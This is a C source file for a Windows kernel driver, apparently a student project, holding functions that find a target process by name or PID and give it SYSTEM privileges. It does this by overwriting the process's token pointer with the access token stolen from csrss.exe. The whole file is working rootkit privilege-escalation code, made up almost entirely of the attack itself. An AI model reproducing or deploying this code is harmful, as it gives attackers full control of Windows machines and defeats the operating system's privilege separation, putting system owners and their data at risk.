/*
** File		root_process.c
** Author	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		RootProcess function find 
** 			and elevate process privileges to root
**			by stealing PrivilegeToken of csrss.exe process
*/

#include <ntifs.h>
#include <stdlib.h>
#include "driver.h"

NTSTATUS	ReplaceToken(
				OUT PEPROCESS toPatch,
				IN PACCESS_TOKEN oldToken,
				IN PACCESS_TOKEN newToken)
{
	ULONG	tokenPointer;
	ULONG	*toReplace;
	
	if (newToken != NULL)
	{
		tokenPointer = *(ULONG *) ((ULONG) toPatch + EPROCESS_TOKEN_OFFSET);
		tokenPointer &= 0xfffffff8;

		if (tokenPointer == (ULONG) oldToken)
		{
			DbgPrintEx(DFLAGS, "Pointers corresponding, now replacing old Token pointer...\n");
			
			toReplace = (ULONG *)((ULONG) toPatch + EPROCESS_TOKEN_OFFSET);
			*toReplace = ((ULONG) newToken & 0xfffffff8);

			DbgPrintEx(DFLAGS, "Token pointer is now: %x\n", newToken);
			return (STATUS_SUCCESS);
		}
	}
	return (STATUS_UNSUCCESSFUL);
}

NTSTATUS			RootProcess(IN PCHAR params)
{
	PEPROCESS		eprocToRoot;
	PEPROCESS		eprocToSteal;
	PACCESS_TOKEN 	newToken;
	PACCESS_TOKEN 	oldToken;

	DbgPrintEx(DFLAGS, "Process to root: %s\n", params);
	if (atoi(params) == 0)
		eprocToRoot = FindEPROCESSByName(params);
	else
		eprocToRoot = FindEPROCESSByPID(atoi(params));

	if (eprocToRoot == 0)
		return (STATUS_INVALID_PARAMETER);
	DbgPrintEx(DFLAGS, "EPROCESS address found: %x\n", eprocToRoot);
	
	eprocToSteal = (PEPROCESS) FindEPROCESSByName("csrss.exe");
	if (eprocToSteal == 0)
		return (STATUS_UNSUCCESSFUL);
	DbgPrintEx(DFLAGS, "EPROCESS address found: %x\n", eprocToSteal);
		
	oldToken = (PACCESS_TOKEN) PsReferencePrimaryToken(eprocToRoot);
	DbgPrintEx(DFLAGS, "TokenToReplace pointer found: %x\n", oldToken);
	
	newToken = (PACCESS_TOKEN) PsReferencePrimaryToken(eprocToSteal);
	DbgPrintEx(DFLAGS, "NewToken pointer found: %x\n", newToken);

	return (ReplaceToken(eprocToRoot, oldToken, newToken));
}
